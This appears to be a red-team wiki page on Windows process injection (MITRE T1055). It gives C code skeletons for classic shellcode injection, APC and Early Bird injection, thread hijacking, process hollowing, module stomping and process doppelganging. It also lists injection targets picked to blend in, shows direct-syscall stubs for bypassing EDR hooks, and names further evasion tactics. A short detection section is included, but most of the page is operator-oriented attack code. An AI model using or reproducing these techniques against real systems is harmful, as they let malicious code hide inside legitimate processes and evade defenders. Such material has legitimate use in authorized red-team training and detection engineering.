# Process Injection & Code Injection

> **MITRE ATT&CK**: Execution / Defense Evasion > T1055 - Process Injection
> **Platforms**: Windows (primarily), Linux (ptrace-based)
> **Required Privileges**: User (same-integrity processes), Admin (cross-session, SYSTEM processes)
> **OPSEC Risk**: Medium-High (API call sequences are heavily monitored by EDR)

---

## Strategic Overview

Process injection is the technique of executing arbitrary code within the address space of another running process. This serves two critical objectives: defense evasion (malicious code runs under the identity of a legitimate process) and privilege escalation (injecting into higher-privileged processes). For a Red Team Lead, process injection is both essential and dangerous. It is essential because it enables code execution that blends with legitimate process activity, but dangerous because modern EDR products hook the Windows API functions used for injection and flag known call sequences. The shift toward direct syscalls, hardware breakpoint-based unhooking, and indirect syscall techniques reflects the ongoing arms race between offense and defense. Operators must understand the entire spectrum of injection techniques and select the appropriate method based on the target's defensive maturity.

## Technical Deep-Dive

### Classic DLL/Shellcode Injection

The foundational injection technique. Well-understood by defenders but still effective when combined with unhooking.

```c
// Step 1: Open target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

// Step 2: Allocate memory in target process
LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, payloadSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Step 3: Write payload to allocated memory
WriteProcessMemory(hProcess, remoteAddr, payload, payloadSize, NULL);

// Step 4: Create remote thread to execute payload
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

### APC Injection

Asynchronous Procedure Calls execute when a thread enters an alertable wait state.

```c
// Find alertable thread in target process (threads calling SleepEx, WaitForSingleObjectEx, etc.)
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadID);

// Allocate and write shellcode to target process (same as classic injection)
LPVOID addr = VirtualAllocEx(hProcess, NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, scSize, NULL);

// Queue APC to execute shellcode when thread becomes alertable
QueueUserAPC((PAPCFUNC)addr, hThread, 0);
```

### Early Bird Injection

APC injection variant that queues the APC before the process fully initializes, guaranteeing execution.

```c
// Create suspended process
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE,
    CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Allocate and write shellcode
LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, addr, shellcode, scSize, NULL);

// Queue APC to main thread (guaranteed to run before entrypoint)
QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);

// Resume process - APC fires immediately
ResumeThread(pi.hThread);
```

### Thread Hijacking (SetThreadContext)

Hijack an existing thread's execution flow without creating a new thread.

```c
// Suspend target thread
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);
SuspendThread(hThread);

// Get current thread context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// Allocate and write shellcode
LPVOID addr = VirtualAllocEx(hProcess, NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, scSize, NULL);

// Redirect instruction pointer to shellcode
ctx.Rip = (DWORD64)addr;  // x64
SetThreadContext(hThread, &ctx);

// Resume thread - now executes shellcode
ResumeThread(hThread);
```

### Process Hollowing

Replace the memory of a legitimate process with a malicious PE.

```c
// Create legitimate process in suspended state
CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE,
    CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Unmap the original executable image
NtUnmapViewOfSection(pi.hProcess, pbi.PebBaseAddress->ImageBaseAddress);

// Allocate memory at the image base of the hollowed process
LPVOID newBase = VirtualAllocEx(pi.hProcess, pbi.PebBaseAddress->ImageBaseAddress,
    payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write PE headers and sections of malicious payload
WriteProcessMemory(pi.hProcess, newBase, payloadBuffer, payloadSize, NULL);

// Update PEB with new image base and fix entrypoint in thread context
// ...
ResumeThread(pi.hThread);
```

### Module Stomping (DLL Hollowing)

Load a legitimate DLL then overwrite its .text section with shellcode.

```c
// Load a legitimate but rarely-used DLL into target process
HMODULE hMod = LoadLibraryA("amsi.dll");  // Or any suitable DLL

// Find the .text section
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
// Find .text section...

// Change memory protection and overwrite with shellcode
DWORD oldProtect;
VirtualProtect(textSection, scSize, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(textSection, shellcode, scSize);
VirtualProtect(textSection, scSize, PAGE_EXECUTE_READ, &oldProtect);

// Execute via CreateThread pointing to the stomped section
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)textSection, NULL, 0, NULL);
```

### Transacted Hollowing (Process Doppelganging)

Uses NTFS transactions to create a fileless process from a malicious payload.

```c
// Create NTFS transaction
HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);

// Create transacted file (exists only within transaction)
HANDLE hFile = CreateFileTransacted("C:\\Windows\\Temp\\legit.exe", GENERIC_WRITE | GENERIC_READ,
    0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);

// Write malicious payload to transacted file
WriteFile(hFile, payloadBuffer, payloadSize, &bytesWritten, NULL);

// Create section from transacted file
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);

// Rollback transaction (file never materializes on disk)
RollbackTransaction(hTransaction);

// Create process from section
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 0, hSection, NULL, NULL, 0);
```

### Shellcode Injection Target Selection

```
Preferred targets for injection (blend with legitimate activity):
- explorer.exe      - Always running, high activity, user-context
- svchost.exe       - Multiple instances, network activity expected
- RuntimeBroker.exe - Common in modern Windows, low scrutiny
- taskhostw.exe     - Legitimate task host, multiple instances
- sihost.exe        - Shell infrastructure host

Avoid injecting into:
- Security products (MsMpEng.exe, CrowdStrike falcon processes)
- Critical system processes (csrss.exe, lsass.exe) unless specifically required
- Processes with integrity levels higher than your current token
```

### Direct Syscalls

Bypass EDR hooks by invoking NT functions directly instead of through ntdll.dll.

```c
// Instead of calling NtAllocateVirtualMemory through ntdll (which EDR hooks),
// invoke the syscall directly using the syscall number

// Syscall stub example (x64)
// mov r10, rcx
// mov eax, <syscall_number>    ; e.g., 0x18 for NtAllocateVirtualMemory
// syscall
// ret

// Tools: SysWhispers2/3 generate syscall stubs automatically
// Indirect syscalls: jump to the syscall instruction inside ntdll.dll
// to avoid EDR detecting direct syscall patterns from non-ntdll memory
```

## Detection & Evasion

### Detection Mechanisms
- **EDR API hooking**: Inline hooks on VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
- **ETW Threat Intelligence provider**: Detects cross-process memory operations
- **Sysmon Event ID 8**: CreateRemoteThread detection
- **Sysmon Event ID 10**: Process access (OpenProcess with suspicious access rights)
- **Memory scanning**: Unbacked executable memory regions (no associated file)
- **Call stack analysis**: Syscalls originating from non-ntdll memory regions

### Evasion Techniques
- Direct syscalls (SysWhispers2/3) to bypass ntdll hooks
- Indirect syscalls to maintain legitimate call stack appearance
- Hardware breakpoint-based unhooking (no memory modification needed)
- Use PAGE_EXECUTE_READ instead of PAGE_EXECUTE_READWRITE (less suspicious)
- Delay execution with legitimate wait operations to avoid sandbox analysis
- Module stomping avoids unbacked memory region detection
- Use NtMapViewOfSection instead of VirtualAllocEx + WriteProcessMemory

## Cross-References

- `03-execution/dotnet-execution.md` - .NET assembly injection via CLR hosting
- `06-defense-evasion/` - EDR evasion and unhooking techniques
- `03-execution/powershell-execution.md` - PowerShell without powershell.exe (in-process)
- `08-privilege-escalation/` - Injection into elevated processes

## References

- Process Injection Techniques (MITRE): https://attack.mitre.org/techniques/T1055/
- Red Team Notes - Process Injection: https://www.ired.team/offensive-security/code-injection-process-injection
- SysWhispers2: https://github.com/jthuraisamy/SysWhispers2
- Donut (Shellcode generator): https://github.com/TheWover/donut
- Process Hollowing deep dive: https://github.com/m0n0ph1/Process-Hollowing
